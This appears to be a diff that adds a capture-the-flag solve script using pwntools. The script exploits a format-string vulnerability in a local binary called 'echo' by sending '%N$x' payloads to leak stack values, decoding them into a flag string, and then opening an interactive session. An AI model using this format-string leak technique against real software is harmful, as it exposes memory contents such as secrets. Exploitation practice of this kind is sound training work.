@@ -1,0 +1,20 @@
+from pwn import *
+
+p = process("./echo")
+
+res = ""
+cnt = 27
+
+while(True):
+    payload = f"%{cnt}$x".encode()
+    p.sendlineafter(b"> ", payload)
+    s = p.recvline()[:-1:].decode().rjust(8, "0")
+    s = s[6:8] + s[4:6] + s[2:4] + s[0:2]
+    s = bytearray.fromhex(s).decode()
+    res += s
+    cnt += 1
+    if('}' in s):
+       break
+
+print(res)
+p.interactive()
